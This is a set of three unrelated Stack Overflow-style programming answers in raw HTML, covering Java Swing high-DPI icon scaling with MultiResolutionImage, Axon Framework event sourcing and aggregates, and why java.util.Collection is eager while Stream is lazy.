href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.desktop/java/awt/image/BaseMultiResolutionImage.html\" rel=\"nofollow noreferrer\"><code>BaseMultiResolutionImage</code></a> (the basic implementation of <a href=\"https://docs.oracle.com/en/java/javase/11/docs/api/java.desktop/java/awt/image/MultiResolutionImage.html\" rel=\"nofollow noreferrer\"><code>MultiResolutionImage</code></a>) to provide higher resolution alternatives. (These are not available in Java 8.)</p>\n<p>You say that you scaled down the original image (240×240) to 18×18px. If the UI needs a higher resolution according to the system setting, all it has now is your small icon (18×18) which will be scaled up, which results in poor quality. You should use a <code>MultiResolutionImage</code> or paint the original image into the required size, letting <code>Graphics</code> to scale it down for you.</p>\n<h1>No Down-Scale</h1>\n<p>This is the simplest way I came up with to make the icon 18×18 without downscaling the original image:</p>\n<pre><code>private static final String IMAGE_URL =\n        &quot;https://tabler-icons.io/static/tabler-icons/icons-png/beach.png&quot;;\n\nprivate static ImageIcon getIcon() {\n    return new ImageIcon(Toolkit.getDefaultToolkit()\n                                .getImage(new URL(IMAGE_URL))) {\n        @Override\n        public int getIconWidth() {\n            return 18;\n        }\n        @Override\n        public int getIconHeight() {\n            return 18;\n        }\n\n        @Override\n        public synchronized void paintIcon(Component c, Graphics g,\n                                           int x, int y) {\n            g.drawImage(getImage(), x, y, 18, 18, null);\n        }\n    };\n}\n</code></pre>\n<p>I left out the exception handling code for <code>MalformedURLException</code> which can be thrown from the <code>URL</code> constructor.</p>\n<p>In this case, the painted image gets down-scaled each time it's painted, which is ineffective. Yet the quality is better. Well, for the standard resolution screen, it's nearly the same as if you down-scaled the image when loading. But in High DPI case, it looks better. It's because for 200% UI Scale, the image will be rendered to 36×36 pixels and these pixels will be created from the source of 240×240 rather than up-scaling the down-scaled version which lost its quality.</p>\n<p><a href=\"https://i.stack.imgur.com/SC57D.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/SC57D.png\" alt=\"The screenshot of the app without down-scaling at 200%\" /></a></p>\n<p>To get even better results, I recommend using <code>MultiResolutionImage</code>.</p>\n<h1>MultiResolutionImage</h1>\n<p>The app below loads the images from base64-encoded strings (for simplicity so that there are no external dependencies). There are three variants provided: 24×24 (100%, 96dpi), 36×36 (150%, 144dpi), 48×48 (200%, 192dpi).</p>\n<p>If the current scale factor is set to any of the provided resolutions, the image will be rendered as is. If 125% or 175% are used, the larger image will be scaled down; if the scale is greater than 200%, then the image for 200% will be scaled up. You can add more resolutions if needed.</p>\n<p>The app doesn't compile in Java 8 because <code>MultiResolutionImage</code> is not available there. To compile it with JDK 11, you have to replace text blocks with regular String concatenation.</p>\n<pre class=\"lang-java prettyprint-override\"><code>import java.awt.Image;\nimport

Thus, the concepts which Axon tries to simplify for you whilst building your application.</p>\n<p>Let me go over your numbered questions from here:</p>\n<ol>\n<li>The reason you'd need <code>@EventSourcingHandler</code> annotated functions in your Aggregate, is to (1) update the Aggregate state based on the (2) events <strong>it</strong> has published. To go to point 1, why would you update the state of your Aggregate? As your Aggregate is the Command Model of your application, it is tasked with making the decisions based on the commands it receives. To be able to make decisions, sometimes an Aggregate needs state, but sometimes it does not. So in the <code>Widget</code> example you've shared, I'd assume that the <code>color</code> field is no used at all to drive business logic later on, hence you could perfectly omit this state from the Aggregate without any problems. With the second point of my response I try to point out that an Aggregate will only ever handle the events which originate from itself. This is as the events are the source of your Aggregate, as the events constitute all the delta's which have occurred on that given model.</li>\n<li>Your following questions fits nicely with proceeding the explanation I've started in point 1. The answer is quite simple, your <code>Widget</code> Aggregate is not stored anywhere, not <em>as is</em>. Every time you'd retrieve your Aggregate from the <code>Repository</code> (this is done automatically for you in Axon), which defaults to an <code>EventSourcingRepository</code> in Axon, all the Events for that given Aggregate will be retrieved from the Event Store. Than, an <em>empty</em> Aggregate instance is created and the framework will replay all the events it has found for that exact Aggregate instance. You're thus effectively Event Sourcing your Aggregate every time a new command comes in. This might sound a little overkill, as the number of events for a given Aggregate might grow to quite a large set. This can be solved by doing things like making <a href=\"https://docs.axoniq.io/reference-guide/axon-framework/tuning/event-snapshots\" rel=\"nofollow noreferrer\">snapshots</a> of the Aggregate.</li>\n<li>If this form of splitting your application in a dedicated part which deals with your business logic, the Command Model, and the part which simply returns a Query Model as an answer, the Query Model, then you could decide to have a <a href=\"https://docs.axoniq.io/reference-guide/implementing-domain-logic/command-handling/state-stored-aggregates\" rel=\"nofollow noreferrer\">State Stored Aggregate</a>. So note, your are not required, at all, to do Event Sourcing when using Axon; it's just the default modus operandi for the framework. Thus I understand the felt concern from your part, that you're duplicating your logic. You can however strictly separate the part which makes all the decisions to be held in your Aggregate.\nThe Query Model (in your example the <code>ProjectedWidget</code>) can be stored in what ever format and in what ever database/tool you'd like, ideally without any business logic.\nIf you do find yourself adding business logic in the Query side of your application, this might suggest you should upgrade this bit as an event originating from your Aggregate's.</li>\n</ol>\n<p>I hope this brings you some insights into why you'd go for Event Sourcing to begin with.

But let's provide a whole bunch of context:</p>\n<blockquote>\n<p>I think that the ideal solution is to return a lazy collection from getInts() (e.g. a collection whose elements are created only when they are actually iterated). Is there a way to create such collections in Java?</p>\n</blockquote>\n<p>You're confused about terminology. Often in officially defined systems (and a programming language is certainly far more specifically defined than your usual human-to-human conversations), terminology gains a far more specific, far more detailedly defined meaning.</p>\n<p>In your head, 'collection' could be lazy, why not, right? Collection is a word, in a dictionary, nothing in the dictionary dictates it MUST be eager.</p>\n<p>But in java, <em><code>j.u.Collection</code> <strong>IMPLIES</strong> eager</em>. Asking for a lazy collection, 'collection' there referring to the english word, that makes sense. asking for 'a lazy Collection', with collection referring specifically to <code>java.util.Collection</code>, <strong>makes no sense</strong>. It's like asking for: &quot;A circle but with a corner&quot;. It's an oxymoron. Given that you're in java land, using the word 'collection' and intending for that to be taken as the dictionary word and not <code>j.u.Collection</code> is a mistake: Words serve to communicate ideas, if the words don't do the job right, you've chosen bad words. It is, naturally, virtually impossible to attempt to disambiguate 'collection - in the sense of english dictionary' and 'collection - in the sense of j.u.Collection', so find another word to convey that notion.</p>\n<p>So, what is java's official term for 'a lazy collection-as-in-dictionary'? <strong>It is <code>Stream</code></strong>.</p>\n<p>Said differently, you have a method whose return type is &quot;EagerCollection&quot; (Except in java we just call that Collection), and are asking: Is there any way to make that non-eager? Well, no. The spec is literally telling you it has to be eager.</p>\n<p>Thinking about the API of a hypothetical 'lazy collection', and going by the API of <code>j.u.Collection</code> for inspiration, it just wouldn't make sense. Lots of API needs to either:</p>\n<ul>\n<li>Be removed entirely for not making sense / having nasty side-effects we would never want to expose.</li>\n<li>Document that it 'consumes' the collection, with no way to return, and/or have ridiculous side-effects such as taking an hour and allocating 2 GB worth of RAM.</li>\n<li>Just isn't a thing you generally would be interested in.</li>\n<li>Needs to throw something.</li>\n<li>Needs to return magic values that have weird meanings, such as <code>size()</code> being specced to return -1 for infinite collections and -2 for 'I have no idea, I might even be infinite'.</li>\n<li>Handcuffs the notion into eliminating the ability of such a concept to apply to use cases even though they feel right (such as adding the handcuff that lazy collections are nevertheless <strong>required</strong> to accurately report size() in a quick and non-destructive manner, which means you can't make a lazy collection to represent data being piped in across the network).</li>\n</ul>\n<p>This is <em>why</em> <code>Stream</code> exists: Different API was required. This is <em>why</em> <code>java.util.Collection</code> (and particularly, <code>java.util.List</code>) inherently means 'eager'.
